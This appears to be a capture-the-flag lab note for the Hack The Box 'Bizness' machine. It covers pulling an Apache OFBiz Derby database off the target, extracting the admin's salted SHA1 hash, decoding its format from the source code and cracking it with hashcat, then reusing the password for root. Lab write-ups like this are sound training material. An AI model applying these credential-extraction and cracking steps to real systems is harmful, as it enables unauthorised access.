---
tags: []
cssclasses:
  - path
---

[[DB-ADMIN]]



Local box:
```
scp ofbiz@bizness.htb:/home/ofbiz/derby.tar.gz .
```

```
tar -xf derby.tar.gz ofbiz/
```

```
ij
```

then, inside the ij utility (prompt of '>')
```
connect 'jdbc:derby:/home/k10/Lab/HTB/Bizness/loot/ofbiz';
```
Full path is required.

Locate the following in the resulting data:
```
admin|$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
```

### Crack the password from the hash

Password hashes don't start with $SHA, so some research was required to figure out what the hash types and data is.



See the include and search for the file:

HashCrypt


find . -name HashCrypt.java

ANSWER:
./framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java

Looking at the function:
public static String cryptBytes(String hashType, String salt, byte[] bytes)
...we can break the password hash into its pices:

hashType: SHA
salt: d
hash: uP0_QaVBpDWFeo8-dRzDqRwXQ2I

...which is a SHA1 hash but it is base64 encoded, as we can see from function:
private static String getCryptedBytes(String hashType, String salt, byte[] bytes)
...and the line:
return Base64.encodeBase64URLSafeString(messagedigest.digest()).replace('+', '.');


![[Pasted image 20240204152903.png]]

Removing spaces:
b8fd3f41a541a435857a8f3e751cc3a91c174362



#### Craft the hashcat command
Find the hashcat mode by looking at this table:
https://hashcat.net/wiki/doku.php?id=example_hashes


Usage: hashcat [options]... hash|hashfile|hccapxfile [dictionary|mask|directory]..

hashcat -m 120 b8fd3f41a541a435857a8f3e751cc3a91c174362:d /usr/share/wordlists/rockyou.txt

```
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Common KVM processor, 5841/5905 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

b8fd3f41a541a435857a8f3e751cc3a91c174362:d:monkeybizness
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: sha1($salt.$pass)
Hash.Target......: b8fd3f41a541a435857a8f3e751cc3a91c174362:d
Time.Started.....: Sun Feb  4 15:36:55 2024 (1 sec)
Time.Estimated...: Sun Feb  4 15:36:56 2024 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2767.0 kH/s (0.39ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 1478656/14344385 (10.31%)
Rejected.........: 0/1478656 (0.00%)
Restore.Point....: 1474560/14344385 (10.28%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: mosnarak -> monkey-moo

Started: Sun Feb  4 15:36:26 2024
Stopped: Sun Feb  4 15:36:57 2024

```

NOW you have the database admin password: monkeybizness

With password re-use, this is the root password.


